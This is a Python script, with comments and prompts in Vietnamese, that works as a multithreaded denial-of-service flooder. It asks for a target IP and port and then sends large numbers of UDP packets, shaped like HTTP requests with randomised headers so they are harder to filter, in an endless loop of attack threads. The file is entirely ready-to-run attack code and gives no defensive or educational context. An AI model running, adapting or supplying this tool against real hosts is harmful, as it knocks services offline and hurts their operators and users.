import socket
import threading
import random
import time

# Danh sách User-Agent lớn hơn để random
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
]

# Danh sách Referer lớn hơn để random
referers = [
    "http://www.google.com/",
    "http://www.bing.com/",
    "http://www.yahoo.com/",
    "http://www.facebook.com/",
    "http://www.twitter.com/",
    "http://www.linkedin.com/",
    "http://www.reddit.com/",
    "http://www.instagram.com/",
]

# Danh sách Accept headers lớn hơn để random
accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
]

def random_headers():
    # Hàm này trả về các tiêu đề ngẫu nhiên
    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "Accept": random.choice(accept_headers)
    }
    return headers

def send_packets(ip, port, num_packets):
    # Hàm gửi gói tin với tiêu đề ngẫu nhiên và gửi với tốc độ tối ưu hơn
    for i in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            headers = random_headers()

            # Tạo gói tin HTTP giả mạo
            packet = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {headers['User-Agent']}\r\nReferer: {headers['Referer']}\r\nAccept: {headers['Accept']}\r\n\r\n".encode()
            
            # Gửi gói tin
            sock.sendto(packet, (ip, port))
            if i % 1000 == 0:
                print(f"Đã gửi {i + 1} gói tin đến {ip}:{port}")
            
            # Giảm thời gian chờ giữa các gói tin để tăng tốc độ gửi
            time.sleep(random.uniform(0.001, 0.01))  # Giảm thời gian chờ để tăng tốc độ
        except Exception as e:
            print(f"Đã xảy ra lỗi: {e}")

def attack(ip, port, num_threads, packets_per_thread):
    print(f"Attacking {ip}:{port} với {num_threads} luồng, mỗi luồng gửi {packets_per_thread} gói tin.")
    
    # Tạo các luồng để gửi gói tin
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets, args=(ip, port, packets_per_thread))
        threads.append(thread)
        thread.start()

    # Chạy tất cả các luồng đến khi bị ngắt
    for thread in threads:
        thread.join()

def main():
    ip = input("Nhập IP hoặc host: ")
    port = int(input("Nhập cổng: "))
    num_threads = int(input("Nhập số luồng (threads) (gợi ý: 100-500): "))
    packets_per_thread = int(input("Nhập số gói tin mỗi luồng gửi (gợi ý: 10000-50000): "))
    
    try:
        # Tạo vòng lặp liên tục để gửi gói tin
        while True:
            attack(ip, port, num_threads, packets_per_thread)
    except KeyboardInterrupt:
        print("Ngắt kết nối. Dừng tấn công.")

if __name__ == "__main__":
    main()
